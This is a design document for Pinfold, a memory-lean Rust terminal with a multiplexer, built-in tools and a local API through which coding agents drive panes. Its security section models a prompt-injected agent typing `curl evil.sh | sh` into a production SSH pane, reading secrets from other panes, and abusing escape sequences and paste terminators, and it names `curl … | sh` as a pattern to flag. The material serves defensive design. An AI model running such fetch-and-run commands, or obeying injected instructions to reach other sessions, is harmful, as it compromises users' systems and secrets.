# Pinfold — Architecture for a Lightweight, Agent-Friendly Terminal

Oct 31, 2026 · @Satheesh

## Summary and goals

Pinfold is a standalone terminal written in Rust, designed **memory-first**. It has its own window and a built-in multiplexer, markdown reader, file manager and git diff viewer, and coding agents can drive every pane through a local API. The main goal is the smallest memory footprint in its class: **15 MB or less with one pane open, and 4 MB or less with the window closed** while agents keep running in the background. Website: pinfold.sh.

**Design principles**

1. **Memory first.** When memory, speed and features conflict, memory wins. Every subsystem has a memory budget, and CI fails any change that goes over it.
2. **Draw on the CPU by default.** A terminal changes a few rows at a time, and redrawing only those rows on the CPU is fast enough. That avoids the 15–300 MB that GPU drivers can add. An OpenGL renderer stays available as an optional build feature.
3. **One process.** The window is part of the background process that owns the panes. Closing the window frees all drawing memory (renderer, glyph cache, fonts), and the panes keep running headless.
4. **Everything is cells.** Tabs, status bar, pickers and built-in tools all draw into the same cell grid as the shell. One renderer, one glyph cache, no widget toolkit.
5. **Tools exist only while open.** The md reader, file manager and diff viewer run in-process, load what they need when opened, and give all of it back to the OS when closed.
6. **Agents are first-class clients.** Anything a human can do with keys, an agent can do over the socket.

**Targets**

| Metric                                 | Target                                    |
| -------------------------------------- | ----------------------------------------- |
| Idle, window open, 1 pane              | ≤ 15 MB on Linux, ≤ 20 MB on macOS        |
| Window closed, panes still running     | ≤ 4 MB plus scrollback                    |
| Each extra idle pane                   | ≤ 400 KB plus scrollback                  |
| 10k lines of scrollback at 120 columns | ≤ 1 MB in RAM                             |
| After closing a tool pane              | Its memory is back with the OS within 2 s |
| Growth over an 8-hour idle soak        | 0 MB                                      |
| Release binary (stripped)              | < 8 MB                                    |
| Cold start to first prompt             | < 80 ms                                   |

Memory is measured as PSS on Linux, which splits shared libraries fairly between the processes that use them, and as phys_footprint on macOS, the figure Activity Monitor shows. Raw RSS is not used because it counts shared libraries in full. These targets are estimates until M0 measures them; macOS is higher because AppKit costs more for any window.

**Non-goals for v1:** ligatures, inline images, a Lua or JS scripting runtime, tabs-as-browser features (Warp-style blocks UI), remote SSH multiplexing, and Windows support. v1 targets Linux (X11 and Wayland) and macOS.

## Prior art

None of the existing terminals combines Alacritty's footprint with tmux, a file manager and an agent API in one binary. Pinfold builds on Alacritty's engine and borrows ideas from the others. Reported memory figures vary a lot between sources and setups, so treat them as rough.

| Project                                                                                      | Stack                          | Reported idle RAM | Built-in mux | What Pinfold borrows                                                             |
| -------------------------------------------------------------------------------------------- | ------------------------------ | ----------------- | ------------ | -------------------------------------------------------------------------------- |
| [foot](https://linuxiac.com/?p=195327)                                                       | C, CPU rendering, Wayland only | \~21 MB           | No           | CPU drawing of damaged rows only; a server mode where windows share loaded fonts |
| [Alacritty](https://commandlinux.com/statistics/linux-terminal-emulator-popularity/)         | Rust, OpenGL ES 2              | \~30 MB           | No           | The `alacritty_terminal` crate (VT parser and grid) and `crossfont`              |
| [Ghostty](https://github.com/chawyehsu/ghostty)                                              | Zig, Metal / OpenGL            | 60–100 MB         | Yes          | Core kept separate from the GUI; `libghostty-vt` as a future engine option       |
| [Kitty](https://dasroot.net/posts/2026/03/linux-terminal-emulators-alacritty-kitty-wezterm/) | C + Python, OpenGL             | 60–100 MB         | Yes          | Remote-control protocol (`kitty @`) as a model for the agent API                 |
| [WezTerm](https://linuxjunkies.org/guides/terminal-emulator-shootout)                        | Rust, OpenGL / wgpu            | 80–320 MB         | Yes          | `portable-pty`, and its mux-server idea                                          |
| [Rio](https://sourceforge.net/p/rio/)                                                        | Rust, wgpu                     | not published     | No           | Redraws only lines that changed                                                  |
| tmux / Zellij                                                                                | C / Rust, TUI                  | a few MB          | Is one       | Prefix keys, sessions, detach and attach                                         |

Three lessons shape the stack choice:

- **The GPU path costs the most memory.** Windows Terminal with 10 tabs was [reported at about 380 MB with hardware rendering and about 100 MB with software rendering](https://github.com/microsoft/terminal/issues/16983). The Rio fork tacterm [cut dedicated GPU memory from 398.6 to 234.5 MiB](https://github.com/narma/tacterm/releases) just by trimming allocations. Older Mesa drivers [allocated about 16 MB per legacy OpenGL context](https://bugs.freedesktop.org/show_bug.cgi?id=65342).
- **The lightest terminal draws on the CPU.** foot, which avoids GPU acceleration on purpose, is lighter than Alacritty. Pinfold follows foot and uses the GPU only as an option.
- **Features cost memory when they are always loaded.** Alacritty and foot are light partly because they have no tabs, splits or scripting. Pinfold gets those features without that cost by loading them only while they are in use.

## Architecture overview

Pinfold runs as **one process**. Its core owns all PTYs, terminal state and sessions, and the window is an optional part of the same process. Closing the window frees the window's memory (pixel buffer, glyph cache, fonts) while the core keeps every pane running at about 4 MB. A separate GUI process would load its own copy of the runtime, so Pinfold avoids one. `pinfold ctl` and `pinfold mcp` are small, short-lived clients that talk to the core over its socket.

&#91;embedded content: Wisp architecture: clients, daemon and per-pane pipeline\]

Output flows up from the child process through the PTY reader into the VT engine. The mux then sends damaged rows to the GUI, which draws them. Agents reach the same mux through the API, and the status engine turns pane events into alerts.

**Threads:** three in total, however many panes are open. One I/O thread polls every PTY, one main thread runs the mux and drawing, and one thread serves the API. Running `pinfold` attaches to the core if one is already running, so windows reopen without copying any state.

## Tech stack

The stack is Alacritty's proven low-level pieces, with no GUI toolkit: winit for the window, CPU drawing by default, and ratatui to lay out the built-in tools inside the cell grid.

| Layer              | Choice                                                                                | Why                                                                                         | Rejected                                                                                         |
| ------------------ | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| Window, input, IME | `winit` + `glutin`                                                                    | Thin and cross-platform; what Alacritty ships                                               | SDL2 (C dependency), Tauri / Electron (100+ MB)                                                  |
| Drawing (default)  | `softbuffer` + Pinfold's own glyph blitter, damaged rows only                         | No GPU driver memory at all; foot shows CPU drawing is fast enough for a terminal           | GPU by default (`wgpu`, OpenGL): drivers add 15–300 MB; `egui` / `iced`: widget layer not needed |
| Drawing (optional) | `glow` (OpenGL 3.3 core profile), behind a build feature                              | For 4K, high-refresh screens; a core profile avoids Mesa's extra memory for legacy contexts | —                                                                                                |
| Fonts              | `crossfont` (FreeType on Linux, CoreText on macOS)                                    | Native rasterizers, already tuned for terminals                                             | `cosmic-text` (full text-layout engine is overkill for a monospace grid)                         |
| VT engine          | [`alacritty_terminal`](https://docs.rs/crate/alacritty_terminal/latest/source/) 0.24+ | Mature, fast, pure Rust                                                                     | `vt100` (incomplete), `libghostty-vt` (no tagged version yet, Zig toolchain)                     |
| PTY                | [`portable-pty`](https://docs.rs/crate/portable-pty/latest) 0.9                       | Unix PTYs on Linux and macOS behind a trait, which leaves a path open to Windows later      | Hand-rolled `openpty`                                                                            |
| Event loop         | `mio` + `crossbeam-channel`                                                           | One I/O thread polls every PTY; no async runtime and no thread per pane                     | `tokio` (adds 1–3 MB and complexity)                                                             |
| Tool UI layout     | `ratatui` with a custom backend writing into Pinfold's grid                           | Battle-tested widgets (lists, tables, paragraphs) at near-zero cost                         | Writing widgets from scratch                                                                     |
| Markdown           | `pulldown-cmark`                                                                      | Streaming parser, tiny                                                                      | `comrak` (bigger AST)                                                                            |
| Syntax colours     | `syntect` loaded lazily, with a curated syntax subset                                 | Good quality; dropped after idle                                                            | `tree-sitter` (a grammar per language costs MBs)                                                 |
| Files              | `ignore` (gitignore-aware walk) + `notify` (watch)                                    | Same engine as ripgrep                                                                      | —                                                                                                |
| Diff               | `git` CLI + `similar` for word-level highlights                                       | Respects the user's git config; nothing resident                                            | `git2` / `gix` (large, always loaded)                                                            |
| IPC                | Unix domain socket, JSON-RPC 2.0 via `serde_json`                                     | Any language can talk to it                                                                 | gRPC (heavy)                                                                                     |
| Config             | `toml` + `serde`                                                                      | One readable file                                                                           | Lua (an embedded VM costs memory)                                                                |
| Notifications      | `notify-rust`                                                                         | Native notifications on Linux (D-Bus) and macOS (Notification Center)                       | —                                                                                                |

The workspace is split into crates so that each piece can be built and tested on its own and compiled out with feature flags: `pinfold-core` (terminal + PTY), `pinfold-mux` (layout + sessions), `pinfold-render`, `pinfold-tools`, `pinfold-api`, and the `pinfold` binary.

## Terminal core and rendering

Each pane is a `Pane` that owns a PTY, an `alacritty_terminal::Term` and a damage set. The renderer redraws only damaged rows, and only when something changed. There is no 60 fps loop.

**Per-pane data path**

1. A single I/O thread polls every PTY with `mio` and reads into one shared 64 KB buffer. Panes do not get their own threads or buffers.
2. The bytes go straight to that pane's VT parser, which updates the grid and marks damaged lines. It also emits events: title, bell, OSC 7 cwd, OSC 133 prompt marks, OSC 9 / 777 notifications.
3. The I/O thread wakes the main thread with a coalesced "dirty" message, at most once per frame.
4. If a window is open and the pane is visible, the renderer redraws only the damaged rows into the window's pixel buffer. Hidden panes and closed windows cost no drawing work or memory.

**Engine abstraction.** All terminal access goes through a small `VtEngine` trait (feed bytes, read grid, resize, scroll, search, damage). `alacritty_terminal` is the first implementation. Swapping in `libghostty-vt` later through C FFI would then be a contained change, for example to get the Kitty graphics protocol.

**Glyph cache.** Glyphs are rasterized once into 8-bit alpha masks and kept in one LRU cache capped at 1 MB, shared by every pane and tool. A typical code screen uses a few hundred glyphs (about 100–200 KB). The cache, the window's pixel buffer and loaded font faces are all freed when the window closes.

**Chrome as cells.** The tab bar, status line, borders and command palette are cell rows drawn by the same pipeline. Borders are box-drawing glyphs, and the tab bar is one row. That removes the need for a second UI renderer.

**Core features for v1:** truecolor, mouse reporting, bracketed paste, focus events, OSC 8 hyperlinks, OSC 52 clipboard, Kitty keyboard protocol, regex search, vi-style selection mode, URL hints, and OSC 133 shell integration (scripts shipped for bash, zsh and fish).

## Built-in multiplexer

Pinfold replaces tmux inside its own window. The daemon holds a tree of **session → tab → split layout → pane**, and the GUI is just a view of it, so detach and attach work like tmux.

- **Layout:** a binary split tree per tab, with ratios stored as fractions so resizes are exact. Preset layouts: even-horizontal, even-vertical, main-left, grid. Zoom toggles one pane to full tab.
- **Pane kinds:** `Shell` (PTY), `Tool` (md / files / diff, in-process) and `Agent` (a PTY pane tagged with an agent profile, which enables status detection).
- **Navigation:** direct keys (Alt + arrows to move, Alt + Shift + arrows to resize) plus a tmux-style prefix mode (Ctrl + a by default) for everything else. A command palette (Ctrl + Shift + p) lists every action with fuzzy search.
- **Detach and attach:** closing the window frees all drawing memory, and the process keeps every PTY running headless. `pinfold attach [session]` reopens it. The daemon exits when the last session ends, unless `keep_alive = true`.
- **Copy mode:** vi keys over scrollback, with search, yank to system clipboard and "send selection to pane" (useful for pasting an error into an agent).
- **Broadcast:** type into several panes at once. This is off by default and shown with a red border.

Pinfold does not try to drive an external tmux. Users who need tmux on remote machines can still run it inside a Pinfold pane.

## Built-in tools

The three tools are in-process `Tool` panes that implement one trait (`render(area, grid)`, `on_key`, `on_event`). They lay out their content with ratatui through a backend that writes straight into Pinfold's grid. Each can be opened by key, from the palette, by CLI (`pinfold open README.md`) or by an agent over the API.

### Markdown reader (`pinfold md`)

- Parses with `pulldown-cmark` and renders headings, lists, tables, task lists, block quotes, links (OSC 8, clickable) and fenced code with syntax colours.
- Has an outline sidebar (jump to heading), search, and follow mode, which re-renders on file change. Follow mode is handy for watching an agent's `PLAN.md` or `TODO.md` update live.
- `syntect` loads only the grammars a file needs, on its first code block, and is freed when the pane closes.
- Images show as `[image: alt]` placeholders in v1. Real images wait on Kitty graphics support (see Risks).

### File manager (`pinfold files`), ranger-style

- Miller columns: parent | current | preview. hjkl or arrow keys to move, with the preview using the md reader, syntax highlighting, a hex view or directory stats.
- Gitignore-aware listing via `ignore`, with git status badges (M, A, ?), and live refresh via `notify`. The watcher only runs while the pane is visible.
- Actions: open in `$EDITOR` in a new split, copy / move / rename / trash, bulk rename in the editor, fuzzy jump, and bookmarks.
- **For agents:** `@` inserts the selected path(s) into the last focused agent pane's prompt. `Ctrl + Enter` opens an agent pane in that directory.

### Git diff viewer (`pinfold diff`)

- Runs `git diff` (or `--staged`, or `<rev>..<rev>`) and parses the unified diff. It shows a file list on the left and hunks on the right, unified or side by side, with word-level highlights from `similar`.
- **Watch mode** re-runs the diff when the working tree changes, so you can watch an agent's edits land in real time.
- Hunk actions: stage (`git apply --cached`), revert (`git apply -R`), and copy the hunk with a comment to an agent pane as review feedback.
- Nothing stays resident when the pane is closed. The diff is plain text held only while it is on screen.

## Agent control API

The daemon listens on a per-user socket and speaks newline-delimited JSON-RPC 2.0. Three front-ends share that one API: the `pinfold ctl` CLI, an MCP server (`pinfold mcp`), and raw socket access for scripts. Every pane gets `PINFOLD_SOCKET` and `PINFOLD_PANE_ID` in its environment, so an agent running inside Pinfold can control its neighbours with no setup.

**Transport and security**

- Socket at `$XDG_RUNTIME_DIR/pinfold/<session>.sock` (on macOS, under the per-user `$TMPDIR`), in a 0700 directory, with mode 0600 and a peer UID check.
- Every call must also carry a capability token. Each pane's token covers only that pane and the panes it spawns; anything else needs your approval. See **Security design** for scopes, protected panes and redaction.
- Every call is written to an audit log you can view with `pinfold ctl log`, so you can always see what an agent did.

**Core methods**

| Method                             | Purpose                                                            | Agent-friendly detail                                             |
| ---------------------------------- | ------------------------------------------------------------------ | ----------------------------------------------------------------- |
| `pane.list`                        | Panes with id, kind, title, cwd, command and status                | Small JSON, no screen contents                                    |
| `pane.spawn`                       | Split or new tab, with command, cwd, env and agent profile         | Returns the pane id at once                                       |
| `pane.send`                        | Send text or keys (`"C-c"`, `"Enter"`)                             | Option to wait until the shell is at a prompt first               |
| `pane.read`                        | Visible screen or a scrollback range                               | Plain text, ANSI stripped, trailing blanks trimmed, by default    |
| `pane.last_output`                 | Output of the last finished command, plus exit code                | Uses OSC 133 marks; the cheapest way for an agent to get a result |
| `pane.wait`                        | Block until a regex matches, idle for N s, prompt returns, or exit | Has a timeout; replaces sleep-and-poll loops                      |
| `pane.status` / `pane.set_status`  | Read or set running / waiting / done / error                       | Agents can self-report                                            |
| `notify`                           | Raise an alert (badge, desktop, sound, webhook)                    | Used by agent hooks                                               |
| `tool.open`                        | Open md, files or diff in a pane                                   | e.g. show the user `PLAN.md`                                      |
| `session.save` / `session.restore` | Snapshots                                                          | Also on a timer                                                   |
| `events.subscribe`                 | Stream of pane output, status changes and exits                    | For orchestrators watching many agents                            |

**Example:** an orchestrator agent runs tests in a side pane and reads only the result.

```
pinfold ctl spawn --split right --name tests -- cargo test
pinfold ctl wait tests --until exit --timeout 600
pinfold ctl last-output tests --tail 60
```

**MCP server.** `pinfold mcp` serves the same methods as MCP tools over stdio (`terminal_spawn`, `terminal_send`, `terminal_read`, `terminal_wait`, ...). Any MCP-capable coding agent can then manage panes without parsing CLI output.

## Agent status alerts

Every agent pane carries a status that Pinfold works out from several signals, strongest first: explicit reports beat terminal escape codes, which beat heuristics. The status shows as a coloured dot on the tab and in the status bar, and changes can raise alerts.

| Status          | Strongest signal                                                                     | Fallback signals                                                                      | Default alert                                              |
| --------------- | ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| Waiting for you | `pinfold ctl set-status waiting`, called from an agent hook                          | Bell (BEL), OSC 9 / 777 notification, or a profile regex matching a permission prompt | Tab badge, desktop notification, sound                     |
| Done            | OSC 133 command-finished mark with exit code 0                                       | Agent process exits 0                                                                 | Tab badge, desktop notification if the window is unfocused |
| Error           | Non-zero exit code                                                                   | Profile regex for error banners                                                       | Red badge, desktop notification                            |
| Idle            | No output for `idle_secs` (default 20) and the PTY's foreground process is the shell | —                                                                                     | Badge only                                                 |
| Running         | Output in the last few seconds, or a child process in the foreground                 | —                                                                                     | None                                                       |

**Agent profiles** are small TOML entries that say how to spot each agent: the command name, a regex for "waiting for approval" prompts, and the resume command for session restore. Pinfold ships profiles for common CLIs (Claude Code, Codex, Gemini CLI, Aider) and users can add their own. Agents with hooks are the most reliable path. For example, Claude Code's notification and stop hooks can call `pinfold ctl notify` and `pinfold ctl set-status`, so no screen scraping is needed.

**Foreground detection.** `tcgetpgrp()` on the PTY tells Pinfold whether the shell or a child owns the terminal, which separates "agent thinking" from "back at the shell". The call works the same on Linux and macOS.

**Alert channels**

- In-window: tab dot, status bar counter ("2 waiting"), and a jump-to-next-waiting key (Ctrl + Shift + w).
- Desktop: native notifications via `notify-rust`. Clicking one focuses the pane.
- Optional: a sound, a webhook or ntfy.sh topic (to get a phone ping when a long agent run needs you), and a shell hook command.
- Rate-limiting and quiet hours, so a chatty agent cannot spam you.

## Session save and restore

Sessions survive at two levels. While the daemon runs, nothing is lost: detach and attach just reconnect the GUI. Across reboots, Pinfold restores from an on-disk snapshot, rebuilding the layout and resuming agents where it can.

**What a snapshot holds** (`$XDG_STATE_HOME/pinfold/sessions/<name>.json`):

- The layout tree (tabs, splits, ratios, zoom, focused pane).
- Per pane: kind, title, cwd (tracked via OSC 7), the command line, the agent profile, and a small allowlisted part of the environment.
- Tool pane state: the file being read and scroll position, the directory in the file manager, the diff range.
- Scrollback, off by default (opt-in per session) and redacted before saving: the last N lines (default 2,000) per pane, zstd-compressed, with a per-session cap (default 5 MB).

Snapshots are written on detach, on clean exit, every 60 seconds if something changed, and on `pinfold ctl session save`. They are written atomically (write to a temp file, then rename).

**Restore rules**

1. Shell panes reopen a fresh shell in the saved cwd, with the old scrollback shown above a dimmed "restored" divider.
2. Agent panes run the profile's resume command, for example `claude --continue`.
3. Other commands are **not** re-run automatically. The pane shows "was running: `npm run dev` — press Enter to restart". Commands on `restore.auto_rerun` (such as `nvim` or `htop`) are re-run.
4. Tool panes reopen at the same file and position.

**Named workspaces.** A project can ship a `.pinfold/layout.toml`, such as editor plus agent plus tests plus diff watcher. `pinfold up` in that directory creates or attaches to that session. This is similar to tmuxinator, but built in.

## Memory budget

Memory is Pinfold's main design target, so every subsystem gets a fixed budget, and CI enforces the total. Scrollback is the biggest cost in any terminal: a full cell is about 24 bytes, so 10k lines at 120 columns kept as live cells would take about 29 MB per pane. Pinfold keeps only the screen and the last 200 lines as live cells and compresses everything older.

**Budget at idle on Linux, one shell pane, window open (estimates to check in M0)**

| Component                                                      | Budget                                         | Freed when the window closes? |
| -------------------------------------------------------------- | ---------------------------------------------- | ----------------------------- |
| Code and static data actually touched (PSS)                    | 4.0 MB                                         | No                            |
| winit and display connection (Wayland or X11)                  | 2.0 MB                                         | Yes                           |
| Window pixel buffer (1920×1080, 4 bytes per pixel)             | 8.0 MB at full HD; 2.0 MB for a 960×540 window | Yes                           |
| Font faces (memory-mapped, touched pages only) and glyph cache | 1.0 MB                                         | Yes                           |
| Mux, API and config                                            | 0.3 MB                                         | No                            |
| One pane: visible grid, 200 hot lines, PTY state               | 0.4 MB                                         | No                            |
| Allocator slack                                                | 0.5 MB                                         | Partly                        |
| **Total, window open**                                         | **≈ 8–16 MB depending on window size**         |                               |
| **Total, window closed**                                       | **≈ 4–5 MB**                                   |                               |

The pixel buffer is the biggest item, and it grows with window size. On a 4K screen it is 33 MB, so on very large windows Pinfold switches to the optional GPU renderer, or draws into a smaller buffer that the compositor scales.

**What "memory left in RAM" means here.** It means three things: low memory while running, no growth over time, and memory that really goes back to the OS when something closes. Freeing objects inside the program is not enough, because allocators often keep freed pages. Pinfold checks all three.

**Techniques**

1. **Tiered scrollback.** Hot: the last 200 lines as cells. Cold: older lines packed into 64-line blocks of UTF-8 text plus style runs, lz4-compressed (about 10–20x smaller than cells). Blocks are decompressed only when you scroll or search into them. With `scrollback.spill = true`, cold blocks go to a temp file instead of RAM, so RAM use stays flat however long the history is.
2. **Trim trailing blanks.** Rows store only up to their last non-blank cell.
3. **No thread per pane.** One I/O thread for all PTYs, one main thread and one API thread. Every thread costs its own stack and allocator arena.
4. **Hand memory back to the OS.** Use `mimalloc` with eager purging, so freed pages go back to the OS within milliseconds. For memory held by C libraries such as FreeType, also call `malloc_trim(0)` on Linux and `malloc_zone_pressure_relief` on macOS after a tool closes, a window closes, or a big output burst ends.
5. **Load lazily, free eagerly.** Syntax grammars, the file watcher, diff text and font faces load on first use and are freed when their pane or window closes. Nothing is "cached in case".
6. **Hard caps everywhere.** Glyph cache 1 MB, API event queue 256 KB per subscriber, notification history 100 items, undo for file operations 50 items. When a cap is hit, the oldest entries are evicted.
7. **No idle work.** No frame loop, no cursor-blink timer when unfocused, no polling. The I/O thread sleeps in the kernel until a PTY has data.
8. **Lean build.** `lto = "fat"`, `codegen-units = 1`, `panic = "abort"`, `strip = true`, `opt-level = "s"` for cold code. Feature flags compile out the GPU renderer, tools or the MCP server.
9. **Enforced in CI.** Every pull request runs a scripted session headless: open 8 panes, `cat` a 50 MB log, open and close md, files and diff, close the window. The build fails if PSS goes over any budget, if memory is not returned within 2 s of closing a tool, or if an 8-hour accelerated soak shows growth. Tools: `smaps_rollup`, `heaptrack`, `dhat`, and `footprint` on macOS.
10. **Visible to users.** `pinfold ctl mem` prints a per-subsystem breakdown (scrollback, glyphs, tools, API queues), and the status bar can show live memory use.

## Config, keybindings and extensibility

Configuration is one TOML file at `~/.config/pinfold/pinfold.toml`, hot-reloaded on save. Extensions go through the API socket rather than an embedded scripting VM, so plugins cost no memory until they run.

```toml
[font]
family = "JetBrains Mono"
size = 13

[scrollback]
hot_lines = 200
max_lines = 50000

[keys]
prefix = "C-a"
split_right = "prefix |"
split_down = "prefix -"
open_files = "prefix f"
open_diff = "prefix g"
next_waiting = "C-S-w"

[alerts]
desktop = true
sound = false
webhook = "https://ntfy.sh/my-topic"

[[agent]]
name = "claude"
match = "^claude"
waiting = "Do you want to|\\(y/n\\)"
resume = "claude --continue"
```

- **Themes:** a `[colors]` table, plus importing Alacritty and Ghostty theme files.
- **Plugins:** any executable that talks JSON-RPC to the socket. A plugin manifest can add palette commands and key bindings that call it. Examples: a "summarize this pane" command that pipes `pane.last_output` to an LLM, or a pane that tails CI.
- **Later (open question):** WASM plugins via a small interpreter such as `wasmi`, for in-process tool panes written by third parties.

## Roadmap

At about 20 weeks of focused work, v0.1 is a daily-driver terminal with a multiplexer, agent API, alerts, built-in tools and session restore on Linux and macOS. The agent API (M3) is the differentiator, so it lands before the built-in tools.

&#91;embedded content: Roadmap: M0 to M5, with exit checks\]

The memory budget check in CI starts in M0 and gates every milestone after it.

## Security design

Pinfold's main security risk is the feature that makes it useful: it gives coding agents a programmable channel into every shell you have open. Agents act on untrusted text (repo files, web pages, tool output), so a prompt-injected agent in one pane could type into your production SSH session in another. The design treats **agents as semi-trusted**, gives each one only its own panes by default, and needs a human to approve anything that crosses into panes it did not create. Everything that reaches Pinfold from program output, files or repos is treated as **untrusted data that can never become input on its own**.

### What we protect

| Asset                                     | Why it matters                                                                |
| ----------------------------------------- | ----------------------------------------------------------------------------- |
| Shell sessions                            | Each one runs with your full user rights, and some are root or production SSH |
| Scrollback and screen contents            | Often hold secrets: tokens printed by CLIs, `.env` files, connection strings  |
| Clipboard                                 | Holds passwords and keys; writable by escape sequences                        |
| Session snapshots, spill files, audit log | Secrets at rest on disk                                                       |
| Config, hooks, plugins, agent profiles    | They define what runs, so tampering with them means code execution            |
| Webhook and notification channels         | The only ways data leaves the machine                                         |

### Threat model

Out of scope: a process already running as your user outside Pinfold with no sandbox. It can already read your files and ptrace your shells, so Pinfold cannot defend against it. Root and kernel compromise are also out of scope.

| #   | Threat                                                   | Example                                                                                                               | Primary control                                                                                             |
| --- | -------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| T1  | A prompt-injected agent moves sideways to another pane   | Agent in pane 3 sends `curl evil.sh \| sh` to your prod SSH pane                                                      | Capability tokens scoped to own panes; approval prompt; protected panes                                     |
| T2  | An agent reads secrets from other panes                  | `pane.read` on a pane that just ran `cat .env`                                                                        | Read scope denied by default; secret redaction                                                              |
| T3  | Hostile program output abuses escape sequences           | Title-report sequence echoes attacker text back into the shell's input; OSC 52 reads the clipboard                    | Reply sequences disabled; clipboard read off; length limits                                                 |
| T4  | Spoofed status or alerts                                 | Output prints a fake OSC 133 "done" or a flood of OSC 9 notifications                                                 | Output-reported status labelled as such; token-signed status preferred; rate limits                         |
| T5  | Malicious repo content                                   | `.pinfold/layout.toml` runs commands on `pinfold up`; `git diff` runs a hostile `core.fsmonitor`                      | Workspace trust prompt; hardened git invocation                                                             |
| T6  | Hostile files in the built-in tools                      | Escape bytes or Trojan Source bidi characters in a filename or markdown file; regex-heavy file stalls the highlighter | Control and bidi characters shown escaped; size and time caps                                               |
| T7  | Paste injection                                          | Pasted text containing `ESC[201~` ends bracketed paste early and runs the rest                                        | Strip paste terminators and control characters; multi-line paste warning                                    |
| T8  | Another local user or a sandboxed app reaches the socket | Shared host; Flatpak app with a socket portal                                                                         | 0700 directory, 0600 socket, peer UID check, token required                                                 |
| T9  | Secrets leak at rest or over the network                 | Snapshot with scrollback copied off the disk; webhook carries output                                                  | Scrollback snapshots off by default and redacted; in-memory key for spill files; webhooks carry status only |
| T10 | Parser bugs or supply-chain compromise                   | Crafted output crashes the VT parser; a bad crate update                                                              | No `unsafe` outside one FFI crate; fuzzing; `cargo-deny`, `cargo-vet`; signed releases                      |

### Trust boundaries

&#91;embedded content: Trust boundaries: every crossing goes through the core's checks\]

The core is the only trusted code path, so it is kept small, has no `unsafe` code, and is fuzzed. Agents enter only with a token, untrusted bytes enter only through the escape and paste filter, and nothing reaches another pane or the network without a grant or a status-only rule.

### Agent API authorization

Every API call carries a capability token, and the core checks it against a scope before doing anything. An agent can fully control the panes it created. Anything else needs a grant from you.

**Identity**

1. The core accepts a connection only if the peer's UID matches its own (`SO_PEERCRED` on Linux, `getpeereid` on macOS). The socket directory is 0700, the socket 0600, and the core refuses to start if the directory is a symlink or owned by someone else.
2. Each pane gets a fresh 256-bit random token in `PINFOLD_TOKEN`. It is held only in memory and dies with the pane. Tokens are compared in constant time and never logged.
3. Your own shell outside Pinfold uses an owner token from `~/.local/state/pinfold/owner.token` (0600). That token has full scope, because it is you.
4. Plugins get their own tokens, with the scopes their manifest declares and you approve at install time.

**Scopes**

| Scope                   | Default for an agent pane | Covers                                                    |
| ----------------------- | ------------------------- | --------------------------------------------------------- |
| `self`                  | Granted                   | Read, send to and set status on its own pane              |
| `spawn`                 | Granted                   | Create panes; the agent then has full control of them     |
| `children`              | Granted                   | Read, send, wait on and close panes it spawned            |
| `notify`                | Granted (rate-limited)    | Raise alerts about its own panes                          |
| `tool.open`             | Granted                   | Open md, files or diff for you to see                     |
| `pane.read:other`       | Asks you                  | Read any pane it did not create                           |
| `pane.send:other`       | Asks you                  | Type into any pane it did not create                      |
| `session.*`             | Denied                    | Save, restore or kill sessions                            |
| `config.*`, `webhook.*` | Never over the API        | Changing config or alert destinations is config-file only |

**Human approval.** When an agent asks for an `:other` scope, Pinfold shows a prompt in the target pane's border, not in the agent's pane. The prompt names the caller, the target and the action, with choices Deny / Allow once / Allow for this session. The prompt is drawn by the core, and no pane output or API call can answer it, so an agent cannot approve its own request. Grants never outlive the session, and `pinfold ctl grants` lists and revokes them.

**Protected panes.** A pane is protected, and refuses all API writes even with a grant, when:

- its foreground process is `ssh`, `sudo`, `su`, `doas` or `mosh`, or runs as root (checked on every send, not only at spawn);
- a password prompt is active (the PTY has echo turned off);
- you mark it with `pinfold ctl protect` or a `protected = true` layout entry.

You can unlock a protected pane for one call with a key press. Reads of protected panes are also redacted.

**Secret redaction.** Text returned by `pane.read` and `last_output` for any pane other than the caller's own goes through a redaction pass. The pass replaces likely secrets with `«redacted:kind»`: private key blocks, AWS, GCP, GitHub, Slack and OpenAI-style keys, JWTs, `password=` pairs, and long high-entropy strings. The same pass runs before anything is written to a snapshot.

**Limits.** Requests over 1 MB are rejected. `pane.send` is capped at 4 KB per call and 20 calls per second per token, and reads at 2 MB per call. Up to 8 connections are allowed per token. These caps protect the core's memory budget as well as security.

**Audit and visibility.** Every call is logged with the caller pane, method, target, scope used and result: a 256 KB in-memory ring plus an optional 0600 file, rotated at 5 MB. A pane being driven by another pane shows a coloured border and a "driven by: pane 3" label for as long as that lasts. `pinfold ctl log --pane 1` answers "what did agents do to this pane?"

**MCP server.** `pinfold mcp` runs over stdio only and uses the token of the pane that launched it. It never opens a network port. Pinfold has no TCP listener in v1.

### Hardening untrusted input

The rule: bytes from programs, files and repos may change what is drawn, but they never become keystrokes, run commands or leave the machine without your action.

**Escape sequences from program output**

| Sequence                                                                             | Risk                                                        | Pinfold default                                                                   |
| ------------------------------------------------------------------------------------ | ----------------------------------------------------------- | --------------------------------------------------------------------------------- |
| Title / icon report (`CSI 21 t`), DECRQSS, font and colour queries that echo strings | Attacker text written back into the shell's input           | Not answered; only fixed-format replies such as cursor position                   |
| OSC 52 clipboard                                                                     | Read: steal the clipboard. Write: plant a malicious command | Read off. Write allowed with a status-bar flash, max 64 KB                        |
| OSC 8 hyperlinks                                                                     | Link text that hides the real target                        | Real URL shown on hover; `http(s)` opens on Ctrl + click; other schemes ask first |
| OSC 9 / 777 notifications                                                            | Spam, or fake alerts that look like system ones             | 1 per 10 s per pane; text sanitized and prefixed with the pane name               |
| OSC 133 marks                                                                        | Fake "done" or exit codes                                   | Shown as "reported by output"; status from an API token or hook outranks it       |
| OSC 7 cwd                                                                            | Path traversal into restore and the file manager            | Must be an existing absolute directory; used only as a hint                       |
| Very long sequences, titles, hyperlinks                                              | Memory exhaustion                                           | Caps: 4 KB per sequence, 256 B per title, 2,000 hyperlinks per pane               |

**Paste.** Bracketed-paste terminators (`ESC[201~`) and other C0/C1 control characters are stripped from pasted text. Pasting more than one line into a shell at a prompt shows a confirmation with the line count. If the paste contains `sudo`, `curl … | sh` or similar patterns, the confirmation highlights them.

**Markdown reader.** Rendering never runs anything. Control characters and escape bytes in the file are shown as visible `^[`-style symbols, never passed to the grid as sequences. Links show their target before opening, and `file://` and relative links open inside Pinfold. Files over 5 MB open as plain text, and syntax highlighting has a 50 ms budget per screen, after which the rest renders uncoloured.

